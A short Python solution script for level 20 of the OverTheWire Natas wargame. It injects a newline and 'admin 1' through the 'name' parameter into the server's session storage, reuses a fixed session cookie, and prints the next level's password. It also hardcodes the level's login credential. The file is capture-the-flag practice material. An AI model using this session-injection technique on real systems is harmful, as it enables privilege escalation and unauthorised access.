import requests as req

url = "http://natas20.natas.labs.overthewire.org/index.php"
payload = "?name=test\nadmin 1"

if __name__ == '__main__':
	r = req.post(url=url + payload, 
				 auth=('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'), 
				 cookies=dict(PHPSESSID="testcookie"))

	r = req.post(url=url, 
				 auth=('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'), 
				 cookies=dict(PHPSESSID="testcookie"))
	i1 = r.text.index("Password: ")
	i2 = r.text[i1:].index("</pre>")+i1
	print(r.text[i1:i2])